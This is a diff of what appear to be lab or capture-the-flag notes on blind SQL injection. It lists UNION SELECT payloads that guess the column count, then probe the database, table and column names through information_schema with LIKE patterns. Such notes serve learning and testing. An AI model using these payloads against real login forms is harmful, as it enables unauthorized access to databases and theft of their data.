@@ -23,9 +23,13 @@ admin123' UNION SELECT 1;--
 /*Guess the number of columns that are returned*/
 admin123' UNION SELECT 1,2,3;-- 
 ## Then we start guess the name of the database
-admin123' UNION SELECT 1,2,3 where database() like '%';--
-admin123' UNION SELECT 1,2,3 where database() like 's%';--
+'admin123' UNION SELECT 1,2,3 where database() like '%';--
+'admin123' UNION SELECT 1,2,3 where database() like 's%';--
 ## Once we have the database name, we start searching for the table name
-admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+'admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+## Now once we have the table name, so we try to figure out the column name
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+
+
 
 ```
